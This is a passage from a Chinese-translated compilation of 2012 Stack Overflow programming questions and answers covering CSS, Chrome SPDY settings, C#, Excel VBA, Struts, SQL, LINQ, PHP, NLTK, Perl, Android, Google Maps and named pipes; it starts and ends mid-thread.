## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:36:22.947

使用 clearfix 类 - 这应该可以完成工作：

```
.clearfix:before,
.clearfix:after {
    content: " ";
    display: table;
}
.clearfix:after {
    clear: both;
}
.clearfix {
    *zoom: 1;
} 
```

检查[http://jsfiddle.net/YyMjJ/1/](http://jsfiddle.net/YyMjJ/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:37:08.640

假设我已经正确理解了这个问题，您可以使用清除 div：

```
 <div id="dre">
        <div class="float" style="height:100px"></div>
        <div class="float" style="height:200px"></div>
        <div class="float" style="height:30px"></div>
        <div id="clear"></div>
    </div> 
```

在这里看到它 - [http://jsfiddle.net/C7FCC/](http://jsfiddle.net/C7FCC/)

# http - 如何在 Google Chrome 中禁用 SPDY

> ID：12264568
> 
> 赞同：14
> 
> 时间：2012-09-04T13:30:23.873
> 
> 标签：http, google-chrome, spdy

我想知道如何在 Google Chrome 中使用 SPDY 协议自动禁用。我需要进行一些与 IDS 相关的测试，为此我想使用 HTTP SSL 而不是 SPDY 临时访问 Twitter 或 Google。

甚至有一个选项可以在 Chrome 中禁用它吗？我在谷歌上找不到任何东西。

问候！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-04T13:31:38.977

好吧，您只需要在`chrome`禁用 SPDY 支持的情况下运行，仅此而已！像这样：

`"...\chrome.exe" --use-spdy=off`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-20T23:27:40.497

您可以通过转到 chrome://flags/ 检查所有设置

并在那里禁用 spdy 并重新启动 chrome。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-06-21T16:58:55.157

```
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome]
"DisableSpdy"=dword:00000001 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2015-09-18T17:55:08.907

禁用实验 QUIC 协议。

铬版本 45.0.2454.93

# c# - 创建将具有像 Dictionary 这样的参数的 c# 方法 对象初始化器

> ID：12264571
> 
> 赞同：3
> 
> 时间：2012-09-04T13:30:38.243
> 
> 标签：c#, .net

我有一个将字典作为参数的方法，如下所示：

```
void Do(Dictionary<string,string> d) 
```

我想创建一个可以像字典集合初始化程序一样调用的方法，如下所示：

```
Do({"sadfs","sdfsa"}, {"sadda","sada"}, ...); 
```

有人知道该怎么做吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T13:32:21.697

你不能 - 你可以使用集合初始化器，但你*必须*指定类型：

```
Do(new Dictionary<string, string> { {"x", "y"}, {"a", "b" } }); 
```

如果字典每次都相同，并且您知道该方法不会改变它，我会将其提取到静态只读变量中，这样做的好处是您可以给它一个有意义的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:44:41.007

像这样定义你的方法

```
public static void TheMethod(IDictionary<string, string> d)
    {
        MessageBox.Show(d.Count);
        // Other processing
    } 
```

并这样称呼它

```
public static void MyMethod(string s)
    {
        TheMethod("name, value");
    } 
```

如果你想传递多个参数，那么只需将定义更改为..

```
public static void TheMethod(ICollection<IDictionary<string, string>> d)
    {
        MessageBox.Show(d.Count);
        // Other processing
    }

public static void MyMethod(string s)
    {
        TheMethod("name, value", "otherName, otherValue");
    } 
```

# excel - 如何使用 VBA 禁用保存和另存为

> ID：12264572
> 
> 赞同：12
> 
> 时间：2012-09-04T13:30:38.060
> 
> 标签：excel, vba

我正在编写一个宏，我需要禁用 VBA 已将所有信息复制并粘贴到的工作簿上的保存功能。这可能吗？

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2012-09-04T13:38:04.660

您可以使用 Workbook_BeforeSave 事件来实现此目的，禁用 CommandBars 不会阻止您的用户使用 CTRL + S 等快捷方式。

```
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)

    MsgBox "You can't save this workbook!"
    Cancel = True

End Sub 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-09-04T13:35:55.707

您可以使用该`Application`对象直接访问工具栏按钮：

```
Private Sub Workbook_Open() 
    Application.CommandBars("Worksheet Menu Bar").Controls("File").Controls("Save As...").Enabled = False 
    Application.CommandBars("Worksheet Menu Bar").Controls("File").Controls("Save").Enabled = False 
End Sub 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-05-27T08:08:40.600

还有一个旁注；我在使用上述代码时遇到了困难，因为我的组织使用的是匈牙利版本的 Excel。因此，如果您使用非英语 EXCEL，则必须以 Excel 的本地语言指定 Controls 元素......在我的情况下，有效的是：

`Application.CommandBars("Worksheet Menu Bar").Controls("Fá&jl").Controls("Menté&s má&ské&nt...").Enabled = False Application.CommandBars("Worksheet Menu Bar").Controls("Fá&jl").Controls("Menté&s").Enabled = False`

# asp.net-mvc - 转到 Visual Studio 2012 中的控制器

> ID：12264573
> 
> 赞同：3
> 
> 时间：2012-09-04T13:30:41.617
> 
> 标签：asp.net-mvc, visual-studio-2012

我的控制器位于另一个类库的非标准位置。有没有办法让视图上的“转到控制器”快捷方式找到这些？

![转到控制器示例](../Images/6a491b51c2ec7f98482f0e4ba0494a0a.png)

# java - bean：java代码中的消息等价物？

> ID：12264575
> 
> 赞同：2
> 
> 时间：2012-09-04T13:30:47.250
> 
> 标签：java, jsp, struts

我正在使用 Struts 1.2，我需要在 JSP 页面中引用一些国际化字符串的值。通常我会使用 < bean:message > 标记来执行此操作，但我需要从 Java 代码（由 <% ... %> 包围）中引用它。

我怎样才能做到这一点？

例如：

```
<% 
person.setName("John Smith");
person.setOccupation("Chef");   // I want to internationalize this string
%> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T15:20:23.317

我认为这是一种方法。

在 struts-config.xml 中，如果您有以下内容：

```
<message-resources parameter="ABC"/> 
```

然后执行以下操作：

在 JSP 的顶部：

```
<%@ page import="java.util.Locale" %>
<%@ page import="org.apache.struts.Globals" %>
<%@ page import="org.apache.struts.util.MessageResources" %> 
```

JSP 中的某处：

```
<%    
MessageResources mr = MessageResources.getMessageResources("ABC");
Locale locale = (Locale) session.getAttribute(Globals.LOCALE_KEY);

person.setName("John Smith");
person.setOccupation(mr.getMessage(locale, "Chef"));
%> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T15:03:01.513

首先，我建议您查看您的 Action/JSP/Taglibs，看看您是否绝对需要在您的 JSP 中使用 scriptlet 代码。使用 Struts 的全部原因是保持一个干净的 MVC 模型，并避免业务逻辑泄漏到您的视图（即 JSP）中。

我建议研究重构您的 scriptlet 代码：

```
<%  
    person.setName("John Smith"); 
    person.setOccupation("Chef");    
%> 
```

直接进入您的 Action 类或可重用的服务方法。

但是，如果您确定绝对*必须*将 scriptlet 代码放入您的 JSP 中。

`< bean:message>`使用 的标记类`org.apache.struts.taglib.bean.MessageTag`。

我查看了这个类的源代码，它又使用了 Struts `TagUtils.retrieveMessageResources`，它返回 Struts MessageResources：`org.apache.struts.util.MessageResources`

与支持 Struts Taglibs 相比，您可以在更一般的上下文中查看模仿/改编此代码。

不过，我再次强烈主张尽可能避免在 scriptlet 代码中使用业务逻辑。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T17:56:47.143

我的方法是：

在你的 jsp 中放一些这个导入：

```
<%@ page import="org.apache.struts.validator.Resources" %> 
```

然后从“Resources”类调用“getMessage()”静态方法，如下所示：

```
<sometag name="p1" value="<%=Resources.getMessage(request, \"my.property.from.resources\")%>"/> 
```

注意：插入文本时不要忘记'=' => 'value="<% **=** ...%>'

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-02-18T15:47:29.800

根据 Gauthier 的建议，这是一种在 Java 代码片段中使用的更简洁的方法。

导入（这里没有变化）：

```
<%@ page import="org.apache.struts.validator.Resources" %> 
```

代码片段：

```
<% 
person.setName("John Smith");
person.setOccupation(Resources.getMessage(request, "occupation.property.from.resources"));
%> 
```

希望它能让事情变得更干净。

# ruby-on-rails - 使用 Spork 进行 sublime-text-2-ruby-tests

> ID：12264577
> 
> 赞同：1
> 
> 时间：2012-09-04T13:31:02.363
> 
> 标签：ruby-on-rails, rspec, sublimetext2, spork

我对 Ruby on Rails 很陌生。我正在关注[http://ruby.railstutorial.org/上的教程](http://ruby.railstutorial.org/)

sublime-text-2-ruby-tests 插件测试非常慢。我们如何将其配置为与 Spork 一起运行以使其更快。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T08:11:03.867

我按照[http://ruby.railstutorial.org/chapters/static-pages#sec-guard](http://ruby.railstutorial.org/chapters/static-pages#sec-guard)上的指南进行操作，效果很好。您将获得 Sublime Text Editor 2 运行一些测试的额外快捷方式。

对于 Linux，它们是：

*   `Ctrl`+ `Shift`+ `R`: 运行单个测试（如果在 it 块上运行）或一组测试（如果在 describe 块上运行）
*   `Ctrl`+ `Shift`+ `E`: 运行最后一个测试
*   `Ctrl`+ `Shift`+ `T`: 运行当前文件中的所有测试

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T23:09:20.693

老问题，但万一它对某人有用。

一旦安装了 sublime-text-2-ruby-test 插件，浏览 Sublime：Preferences -> Package Settings -> RubyTest -> Settings - Default。

在该文件中，将 "run_rspec_command": "rspec {relative_path}" 更改为 "run_rspec_command": "bundle exec rspec {relative_path} --drb"

# sql - 使用 DISTINCT 和 ORDER BY 时出现 SQL 查询问题

> ID：12264581
> 
> 赞同：0
> 
> 时间：2012-09-04T13:31:14.833
> 
> 标签：sql, sql-server, sql-server-2008, tsql

给定一个名为 Messages 的数据库表，其中包含以下列：-

```
MessageID, FromUser, ToUser, Message, DateTime 
```

我想编写一个 SQL 查询，它为“FromUser”列选择不同的值，但我也想要按 DateTime 排序的值。

本质上，一个查询，例如：

```
SELECT * FROM Messages WHERE ToUser='1' ORDER BY DateTime DESC 
```

然后，使用以下内容选择不同的 FromUser：

```
SELECT DISTINCT FromUser FROM Messages WHERE ToUser='1' 
```

同时，维护上一个查询的排序。

我尝试使用嵌套查询并遇到问题，因为您无法在内部查询中使用 ORDER BY。

本质上，我希望查询的语法表示（这是无效的，但是......）：

```
SELECT DISTINCT FromUser FROM Messages WHERE ToUser=1 AND FromUser IN 
(SELECT * FROM Messages WHERE ToUser=1 ORDER BY DateTime DESC) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:45:38.870

我猜这就是你需要的：

```
;WITH CTE AS
(
    SELECT *, ROW_NUMBER() OVER(PARTITION BY [FromUser] ORDER BY [DateTime] DESC) RN
    FROM [Messages]
    WHERE ToUser='1' 
)
SELECT *
FROM CTE
WHERE RN = 1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:49:21.213

您将为每个 FromUser 设置多个时间戳。我将假设您想为每个人使用最后一个时间戳。

```
select * 
from Messages join 
    (select fromuser, MAX(datetime) as lastdate from Messages
    group by FromUser) as abb1 on abb1.FromUser = messages.FromUser and abb1.lastdate = messages.Datetime
where ToUser = '1'
order by Datetime desc 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:53:23.217

另一种方式;

```
select * from
(
    select *, max(DateTime) over (partition by FromUser) newest
    from Messages
) T
where DateTime = newest 
```

（如果同一个人的日期相同，则为 n 行）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-04T13:47:06.367

因此`DateTime`，在您的`select`语句中包含，或者按它分组，或者使用聚合函数之一，例如`MAX()`，像：

```
 Select fromuser, datetime
    from messages
    where touser = '1'
    group by 
    fromuser, datetime
    order by 
    fromuser, datetime 
```

或者

```
Select fromuser, max(datetime) as max_datetime
from messages
where touser = '1'
group by 
fromuser 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-04T13:50:03.550

```
SELECT DISTINCT [Messages].[FromUser] FROM (
SELECT [FromUser] as [FromUser], MAX(DateTime) as [Date]
FROM [Messages]
GROUP BY [FromUser]) as [Messages] 
```

# asp.net - 搜索条件的 LINQ 查询

> ID：12264582
> 
> 赞同：0
> 
> 时间：2012-09-04T13:31:17.390
> 
> 标签：asp.net, vb.net, linq, linq-to-entities

我有 5-6 个文本框和下拉列表，基于我想要获取结果的值，使用 OR 条件，此查询工作正常，但是当我对多个条件使用 AND 时，由于显而易见的原因，它不会给我任何结果。现在我的问题是如何更改此查询以使其适用于 AND 和 OR 条件。

询问

```
Public Sub SerachCriteria()
    Debugger.Break()
    Dim s = New Ex1DataContext(SPContext.Current.Web.Url)
    Dim vendors = s.PurchaseOrderWrite
    Dim query = From vendor In vendors.ToList() _
                Where (Not ddsearchorderVendor.SelectedItem.Text = "--Select--" AndAlso vendor.Supplier.Title = ddsearchorderVendor.SelectedItem.Text) _
                Or (Not ddsearchorderStatus.SelectedItem.Text = "--Select--" AndAlso vendor.Status = ddsearchorderStatus.SelectedItem.Text) _
                Or (Not txtSearchOrder.Text Is Nothing AndAlso vendor.Purchaseorderno = txtSearchOrder.Text) _
                Or (Not ddsearchorderdate.Text = "--Select--" AndAlso vendor.Orderdate = ddsearchorderdate.Date) _
                Select vendor.Purchaseorderno
    For Each a In query
        listpurchaseorder.Items.Add(a)
        listpurchaseorder.DataTextField = "Purchaseorderno"
        listpurchaseorder.DataValueField = "ID"
        listpurchaseorder.DataBind()
    Next
    SerachCriteriaPartNo()
End Sub 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T17:07:17.860

听起来您正在寻找实现动态查询。虽然 LINQ 为您提供了很好的类型安全的编译时检查，但当您需要动态构建查询时它可能会有点混乱。

看看 Scott Gu 关于动态 LINQ 查询的文章：

[http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx](http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T18:01:01.367

对于 And，您可以使用一种策略，根据需要连接多个 where 子句。请参阅[http://www.thinqlinq.com/Post.aspx/Title/Dynamically-extending-LINQ-queryies-without-building-expression-trees](http://www.thinqlinq.com/Post.aspx/Title/Dynamically-extending-LINQ-queryies-without-building-expression-trees)。或者更棘手，因为它们通常需要您的实现或动态表达式树创建。结合 And 和 Or 最好考虑使用带有 Linq to SQL 的动态查询库。

如果您使用的是 EF，我会推荐 EF 的 ObjectBuilder 方法或 EntitySQL。有关 ObjectQuery，请参阅[http://thedatafarm.com/blog/data-access/querying-with-linq-to-entities-vs-objectquery-in-ef/ 。](http://thedatafarm.com/blog/data-access/querying-with-linq-to-entities-vs-objectquery-in-ef/)另请查看[http://archive.msdn.microsoft.com/EFQuerySamples](http://archive.msdn.microsoft.com/EFQuerySamples)中的 BuilderMethodSamples 。有了这个，您可以使用字符串 concat 来构建您的 where 子句。它们仍然会被参数化，并且比动态 sql 更难进行 SQL 注入。

# php - 在 php 中包含文件或 require_once() 的替代方法

> ID：12264584
> 
> 赞同：0
> 
> 时间：2012-09-04T13:31:22.627
> 
> 标签：php

我是 PHP 新手，所以不知道是否有任何替代`require_once()`. 我的问题是：目前我在几乎每个需要使用`require_once()`. 我不想在每个文件中都包含我的配置文件，因为它可能会导致一些安全风险。任何形式的帮助都会受到重视。提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:34:33.277

您可以使用 php.ini 设置[auto_prepend_file](http://php.net/auto_prepend_file)在启动 php 进程时自动包含文件。

# tsql - T-SQL 子查询返回列结果

> ID：12264585
> 
> 赞同：0
> 
> 时间：2012-09-04T13:31:29.820
> 
> 标签：tsql, correlated-subquery

我需要从子查询中指定的列返回信息。在下面的子查询中，我试图从 PaymentDate 列返回信息。当我尝试在查询中选择 Order.PaymentDate 时，我收到一个错误`Invalid object name`。`Order.PaymentDate`我试图将其指定为 Payment.PaymentDate 但我得到了同样的错误。关于如何解决这个问题的任何想法？

```
(SELECT ID, SUM(amount) AS purchase FROM Order
WHERE Order.PaymentDate BETWEEN '2012-09-01' AND '2012-09-04'
AND Order.amount >=0
    GROUP BY ID)Payment 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:35:27.190

如果您希望在外部查询中使用 order.payment 日期，则需要`group by`它，但我怀疑这就是您想要的。你想要一个聚合函数，比如`max(order.payment)`or `min(order.payment)`？您不能在同一个查询中混合使用聚合函数和非聚合函数。

如果您想要，正如您在对另一个答案的评论中所说，验证您的日期范围标准是否已应用，请返回 max() 和 min() 值范围，例如：

```
 (SELECT ID, SUM(amount) AS purchase, 
min(order.paymentdate) as min_payment, 
max(order.paymentdate) as max_payment 
FROM Order
    WHERE Order.PaymentDate BETWEEN '2012-09-01' AND '2012-09-04'
    AND Order.amount >=0
        GROUP BY ID)Payment 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:58:33.313

由于您正在获取日期范围的聚合，因此在您的子查询的任何返回行中都没有任何特定日期。您始终可以在外部查询中任意声明日期范围，以显示聚合求和的日期范围。

```
SELECT Payment.ID, Payment.purchase, '2012-09-01' AS 'startdate', '2012-09-04' AS 'enddate' 
FROM (SELECT ID, SUM(amount) AS purchase 
     FROM Order 
     WHERE Order.PaymentDate BETWEEN '2012-09-01' AND '2012-09-04' 
     AND Order.amount >=0 
     GROUP BY ID) AS Payment 
```

# nlp - 如何从 NLTK 中的文本中提取关系

> ID：12264593
> 
> 赞同：8
> 
> 时间：2012-09-04T13:31:53.053
> 
> 标签：nlp, nltk

嗨，我正在尝试根据此处的倒数第二个示例从文本字符串中提取关系：[https ://web.archive.org/web/20120907184244/http://nltk.googlecode.com/svn/trunk/doc /howto/relextract.html](https://web.archive.org/web/20120907184244/http://nltk.googlecode.com/svn/trunk/doc/howto/relextract.html)

从诸如“出版商周刊的迈克尔詹姆斯编辑”之类的字符串中，我想要的结果是有一个输出，例如：

> [PER：'Michael James']'，'[ORG：'Publishers Weekly']的编辑

最好的方法是什么？extract_rels 期望什么格式以及如何格式化我的输入以满足该要求？

* * *

尝试自己做，但没有奏效。这是我从书中改编的代码。我没有打印任何结果。我究竟做错了什么？

```
class doc():
 pass

doc.headline = ['this is expected by nltk.sem.extract_rels but not used in this script']

def findrelations(text):
roles = """
(.*(                   
analyst|
editor|
librarian).*)|
researcher|
spokes(wo)?man|
writer|
,\sof\sthe?\s*  # "X, of (the) Y"
"""
ROLES = re.compile(roles, re.VERBOSE)
tokenizedsentences = nltk.sent_tokenize(text)
for sentence in tokenizedsentences:
    taggedwords  = nltk.pos_tag(nltk.word_tokenize(sentence))
    doc.text = nltk.batch_ne_chunk(taggedwords)
    print doc.text
    for rel in relextract.extract_rels('PER', 'ORG', doc, corpus='ieer', pattern=ROLES):
        print relextract.show_raw_rtuple(rel) # doctest: +ELLIPSIS 
```

> text ="出版商周刊的迈克尔·詹姆斯编辑"
> 
> 查找关系（文本）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-12-03T16:46:53.797

这里有一个基于你的代码（只有很少的调整），效果很好；）

```
import nltk
import re 
from nltk.chunk import ne_chunk_sents
from nltk.sem import relextract

def findrelations(text):
    roles = """
    (.*(                   
    analyst|
    editor|
    librarian).*)|
    researcher|
    spokes(wo)?man|
    writer|
    ,\sof\sthe?\s*  # "X, of (the) Y"
    """
    ROLES = re.compile(roles, re.VERBOSE)

    sentences = nltk.sent_tokenize(text)
    tokenized_sentences = [nltk.word_tokenize(sentence) for sentence in sentences]
    tagged_sentences = [nltk.pos_tag(sentence) for sentence in tokenized_sentences]
    chunked_sentences = nltk.ne_chunk_sents(tagged_sentences)

    for doc in chunked_sentences:
        print doc
        for rel in relextract.extract_rels('PER', 'ORG', doc, corpus='ace', pattern=ROLES):
            #it is a tree, so you need to work on it to output what you want
            print relextract.show_raw_rtuple(rel) 

findrelations('Michael James editor of Publishers Weekly') 
```

(S (PERSON Michael/NNP) (PERSON James/NNP) 编辑/NN of/IN (ORGANIZATION Publishers/NNS Weekly/NNP))

# sql - 如何在IF语句的Sql Server存储过程中检查参数是否为空或null？

> ID：12264602
> 
> 赞同：25
> 
> 时间：2012-09-04T13:32:19.480
> 
> 标签：sql, sql-server-2005

我读到这个：[如何检查 Sql 服务器字符串是否为空或为空](https://stackoverflow.com/questions/334108/how-do-i-check-if-a-sql-server-string-is-null-or-empty)，但在这种情况下它对我没有帮助。

我的存储过程中的一段代码：

```
IF (@item1 IS NOT NULL) OR (LEN(@item1) > 0)
        SELECT @sql = 'SELECT * FROM TEST1'
    ELSE
        SELECT @sql = 'SELECT * FROM TEST2'
 PRINT @sql; 
```

`@item1`是`NVARCHAR(1000)`类型。

执行此存储过程时，我提供了值`item1`

```
EXEC    [dbo].[my_proc]
        @item1 = N'' 
```

表明

`SELECT * FROM TEST1`// 如果是正确的`@item1 = N'some'`

代替

`SELECT * FROM TEST2`

它是 sql 中的某个函数，用于验证字符串是否为空或为空，**或者**我在某处犯了错误？

就像在 C# 中一样 ->`string.IsNullOrEmpty(myValue)`

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-09-04T13:34:57.100

这是正确的行为。

如果您将 @ 设置`item1`为一个值，则以下表达式将为真

```
IF (@item1 IS NOT NULL) OR (LEN(@item1) > 0) 
```

无论如何，在 SQL Server 中没有这样的功能，但您可以创建自己的：

```
CREATE FUNCTION dbo.IsNullOrEmpty(@x varchar(max)) returns bit as
BEGIN
IF @SomeVarcharParm IS NOT NULL AND LEN(@SomeVarcharParm) > 0
    RETURN 0
ELSE
    RETURN 1
END 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2016-06-16T18:09:37.323

要检查变量是否为空或为空，请使用以下命令：

```
IF LEN(ISNULL(@var, '')) = 0
    -- Is empty or NULL
ELSE
    -- Is not empty and is not NULL 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-04T13:35:02.153

当然可以；什么时候`@item1 = N''`，它`IS NOT NULL`。

您可以在存储过程的顶部默认定义`@item1`为`NULL`，然后不传入参数。

# python - 使用 Perl 在 Octave 中操作文件

> ID：12264604
> 
> 赞同：-2
> 
> 时间：2012-09-04T13:32:20.947
> 
> 标签：python, perl, file, octave, file-manipulation

我需要在例程中间从 Octave 中操作文件。目前我通过从 Octave 保存一个文件来结束这个例程

```
save data_for_training -ascii train_data 
```

然后手动，乏味地编辑保存的文件，然后通过首先读取编辑的文件，在一个新的不同的 Octave 例程中恢复操作。从概念上讲，所需的文件操作与[此 SO 发布](https://stackoverflow.com/questions/8247499/use-python-to-manipulate-txt-file-presentation-of-key-value-grouping)中概述的操作相反，即保存的文件看起来像这样

```
a b c d e f ... z 0 0 0 0 1  
g h i j k l ... z 0 0 0 1 0 
```

必须被操纵到

```
a b c d e f ... z  
0 0 0 0 1  
g h i j k l ... z  
0 0 0 1 0 
```

其中字母实际上是数字，但为了清楚起见，我使用了字母。换行符总是在每行倒数第五个数字之前，即每行的最后一个 0 0 0 0 1 需要移到该行下方，并且所有行上的所有数字都用空格分隔。

我已经用 Perl 和 Python 标签标记了这个问题，因为[Octave 中有 Perl 和 Python 函数，](https://www.gnu.org/software/octave/doc/interpreter/Controlling-Subprocesses.html#index-perl-3253)所以我假设我可以通过编写脚本文件来执行上述操作来轻松实现我想要的。如果我在这个假设中是正确的，任何人都可以给我 Perl/Python 脚本文件的开始/网络链接 - 我以前从未使用过吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T15:20:01.340

```
#!/usr/bin/env perl
while (<>) {
   my @f = split;
   print("@f[0..$#f-5]\n@f[-5..-1]\n");
} 
```

或者

```
#!/usr/bin/env perl
while (<>) {
   s/\S\K\s+(?=\S+(?:\s+\S+){4}$)/\n/;
   print;
} 
```

用法：

```
perl script.pl file.in >file.out 
```

或者

```
script.pl file.in >file.out   # Requires: chmod u+x script.pl 
```

或者

```
perl -pale'$_="@F[0..$#F-5]\n@F[-5..-1]"' file.in >file.out 
```

或者

```
perl -pe's/\S\K\s+(?=\S+(?:\s+\S+){4}$)/\n/' file.in >file.out 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T15:21:47.470

```
open my $input,  '<', 'data_for_training';
open my $output, '>', 'data_for_training2';

while( <$input> ) {
    chomp;
    ( my $line  = $_ ) =~ s/((\s\d+){5})$//;
    ( my $line2 = $1 ) =~ s/^\s//;

    print $output "$line\n$line2\n";
}
close $input;
close $output; 
```

# java - android服务上的依赖注入

> ID：12264610
> 
> 赞同：1
> 
> 时间：2012-09-04T13:32:34.703
> 
> 标签：java, android, dependency-injection, roboguice

我正在开发一个 Android 应用程序并使用 Roboguice 2.0。

一切都进展顺利，除了现在。我正在尝试将我的自定义绑定注入到这样的服务中，但它不起作用。

```
 @Inject
private TicketService ticketService;

@Inject
private PerformanceService performanceService; 
```

他们已经像这样绑定（首先是自定义应用程序上下文）：

```
 RoboGuice.setBaseApplicationInjector(
            this, 
            RoboGuice.DEFAULT_STAGE,
            Modules.override(RoboGuice.newDefaultRoboModule(this))
                .with(
                    new KoliseoModule(),
                    new DatastoreModule(this),
                    new ServiceModule()
                    ));

 public class ServiceModule extends AbstractModule {

@Override
protected void configure() {
      bind(JsonCheckinTimestampService.class).to(JsonCheckinTimestampServiceImpl.class);
    bind(PerformanceService.class).to(PerformanceServiceImpl.class);
    bind(ShowService.class).to(ShowServiceImpl.class);
    bind(TicketService.class).to(TicketServiceImpl.class);
    bind(ValidationStatisticsService.class).to(ValidationStatisticsServiceImpl.class);
} 
```

}

有任何想法吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T14:55:42.390

很有可能甚至可能保证在创建其余实例之前加载和实例化应用程序的应用程序子类，因此您可以尝试这样做。创建一个“MyApplication extends Application”类并在其“onCreate()”中进行设置，不要忘记在清单中声明。

# jquery - 谷歌地图工具提示的 jQuery 更改处理程序

> ID：12264617
> 
> 赞同：1
> 
> 时间：2012-09-04T13:33:03.903
> 
> 标签：jquery, google-maps-api-3

我在我的网络应用程序中使用 Google Maps Javascript API。每当用户在地图上绘制标记/覆盖时，显示当前打开的表单的自定义工具提示。我想使用 jQuery 使其中一个表单交互 - 具体来说，我希望根据表单顶部单选按钮的选择来显示不同的表单字段。但是，我的 jQuery .change() 处理程序似乎没有触发。

我添加工具提示的代码如下所示：

```
google.maps.event.addListener(drawingManager, 'circlecomplete', function(circle) {
  var radius = circle.getRadius();
  var center = circle.getCenter();
  var circleForm = "<%= escape_javascript(haml(:tooltip_form)) %>";
  var circleInfoWindow = new google.maps.InfoWindow({
    content: circleForm
  });
  circleInfoWindow.setPosition(circle.getCenter());
  circleInfoWindow.open(map); 
```

有问题的单选按钮位于 tooltip_form.haml 中，名为“group1”。在同一个 $(document).ready() 块的底部，我的 jQuery 代码如下所示：

```
$("input[name='group1']").change(function() {
  alert("Changed"); // sample code
}); 
```

但是，当工具提示出现并且我更改单选按钮选择时，处理程序没有触发。我发现如果我将名为“group1”的单选按钮添加到页面本身，处理程序会触发，但是当它们位于绘制圆圈后出现的工具提示中时，处理程序不会触发。谁能帮我解决这个问题？

# c - 如何写入命名管道而不等待读取管道

> ID：12264622
> 
> 赞同：3
> 
> 时间：2012-09-04T13:33:09.527
> 
> 标签：c, linux, named-pipes

我正在写入管道，直到用户输入字符串“end”。如果用户输入字符串“end”，我想更进一步。在这里，我必须关闭管道并打印消息“写入管道后”。但即使我输入了“end”字符串，它也没有打印“写入管道后”行。即使没有读取管道的过程，我如何关闭管道并走得更远？..

嗨，这是我的代码。，

```
int main() {
int fd;
char *b, *c;
printf("Enter Str : ");
b = malloc(50);
gets(b);

while(strcmp(b,"end")!=0){
    if(access("MSG",F_OK) != -1)    // check pipe is already available.
    {
        fd = open("MSG", O_WRONLY);
        write(fd, b, strlen(b) );
    }
    else
    {
        if( mkfifo("MSG", 0666) != -1)  // create pipe if not available.
        {
            fd = open("MSG", O_WRONLY);
            write(fd, b, strlen(b) );               
        }
    }
    printf("Enter Str : ");
    gets(b);
}   
close(fd);
printf("After Written to Pipe");

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:43:23.900

从[`mkfifo(3)`](http://linux.die.net/man/3/mkfifo)手册页：

> 但是，它必须同时在两端打开，然后才能继续对其进行任何输入或输出操作。打开一个 FIFO 进行读取通常会阻塞，直到某个其他进程打开同一个 FIFO 进行写入，反之亦然。

上面的段落意味着`write`将阻塞，直到有人从 FIFO 中读取，这就是您在程序中看到的内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-22T13:12:56.013

命名管道在这里不是正确的工具，因为`bash`无法在非阻塞模式下使用它们。

你*可以*用一种编程语言编写一个工具，它的行为类似于`cat`，但不会阻塞。但[我发现的任何结果都没有](https://www.google.com/search?num=20&hl=en&safe=off&tbo=1&biw=1566&bih=1066&tbs=li:1&q=bash%20non-blocking%20named%20pipe&oq=&aq=&aqi=&aql=&gs_sm=&gs_upl=)让我很高兴向你推荐它们。

否则它是套接字（使用`netcat`and `localhost`），不幸的是，它是不安全的，因为您计算机上的每个其他用户也可以访问它们......</p>

或某种充当缓冲区的普通文件。但是你会遇到如何删除你已经读过的行以使其不会泛滥的问题，以及竞争条件和所有那些噩梦。

对不起，但这里确实没有一个好的解决方案。为了以正确的方式解决这个问题，需要修补 bash 和 cat 以添加一个选项以允许非阻塞行为。

# android - 不幸的是你的应用程序必须关闭

> ID：12264623
> 
> 赞同：-5
> 
> 时间：2012-09-04T13:33:18.340
> 
> 标签：android

我收到此错误：“不幸的是，您的应用程序必须停止”

Logcat 是，请有人告诉我问题出在哪里？

```
09-04 13:29:56.840: E/AndroidRuntime(574): FATAL EXCEPTION: main
